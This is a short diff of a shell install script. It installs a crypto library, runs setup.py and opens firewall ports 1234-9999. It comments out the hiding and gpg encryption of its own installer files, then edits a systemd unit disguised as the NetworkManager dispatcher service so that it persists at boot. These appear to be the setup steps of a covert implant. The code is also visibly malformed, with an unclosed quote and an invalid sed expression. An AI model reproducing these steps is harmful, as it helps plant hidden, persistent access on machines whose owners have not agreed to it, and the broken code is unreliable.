@@ -8,9 +8,9 @@ pip3 install cryptography;
 python3 setup.py;
 
 firewall-cmd --add-port=1234-9999/tcp;
-mkdir .local
-mv setup.py install.sh .local/
-gpg -c .local/*
+# mkdir .local
+# mv setup.py install.sh .local/
+# gpg -c .local/*
 
 file_path="/root/etc/systemd/system/dbus-org.freedesktop.nm-dispatcher.service
 sed -i "${14a}a\\WantedBy=multi-user.target" "$file_path"
